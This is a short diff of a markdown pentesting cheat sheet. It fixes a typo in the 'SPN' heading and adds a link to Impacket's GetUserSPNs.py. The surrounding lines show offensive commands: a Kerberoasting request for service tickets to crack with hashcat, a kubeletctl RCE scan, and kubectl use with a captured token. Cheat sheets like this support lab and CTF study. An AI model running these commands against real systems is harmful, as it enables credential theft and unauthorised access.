@@ -310,13 +310,16 @@ kubectl --token=$token --certificate-authority=ca.crt -server=https://$IP:8443 g
 ./kubeletctl_linux_amd64 --server $IP scan rce
 ```
 
-## SPN (Service Principal NAme)
+## SPN (Service Principal Name)
 GetUserSPNs.py enumerates the user accounts with SPN, and get the TGS.
 This TGS is used for password cracking by using hashcat.
+
 
 ```
 GetUserSPNs.py -request -dc-ip $IP $Domain/SVC_TGS -save -outputfile GetUserSPNs.out
 ```
+
+[GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
 
 # Password Cracking
 ## hydra
